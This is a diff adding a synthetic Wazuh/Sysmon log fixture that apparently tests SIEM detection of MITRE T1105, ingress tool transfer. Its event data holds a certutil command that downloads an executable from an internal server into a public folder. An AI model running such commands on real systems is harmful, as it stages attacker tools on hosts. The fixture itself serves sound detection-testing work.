@@ -1,0 +1,82 @@
+{
+  "_metadata": {
+    "attack_id": "T1105",
+    "variation": "001",
+    "name": "Certutil Tool Download",
+    "description": "Using certutil.exe to download malicious tool from remote server",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "command-and-control",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "campaign": "27"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - certutil download",
+      "sequence": 1,
+      "timestamp": "2026-02-10T16:06:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:06:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: certutil.exe downloading file",
+          "id": "92052",
+          "mitre": {
+            "id": ["T1105"],
+            "tactic": ["Command and Control"],
+            "technique": ["Ingress Tool Transfer"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1", "windows", "lolbin"]
+        },
+        "agent": {
+          "id": "013",
+          "name": "FS01",
+          "ip": "10.1.0.11"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707581960.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "FS01.yourcompany.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:06:00.000",
+              "processGuid": "{8df8f34e-2713-65c7-0001-000000000700}",
+              "processId": "4788",
+              "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
+              "commandLine": "certutil.exe -urlcache -f http://10.1.0.50:8080/tool.exe C:\\\\Users\\\\Public\\\\tool.exe",
+              "currentDirectory": "C:\\\\Users\\\\Administrator\\\\",
+              "user": "YOURCOMPANY\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=5C8D54D3E4B8E9D3E2C1D0A9F8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D3E2F1A0B9",
+              "parentProcessGuid": "{8df8f34e-2713-65c7-0000-000000000700}",
+              "parentProcessId": "2344",
+              "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 8,
+        "fomorian_campaign": 27,
+        "fomorian_technique": "T1105",
+        "fomorian_technique_name": "Ingress Tool Transfer - certutil"
+      }
+    }
+  ]
+}
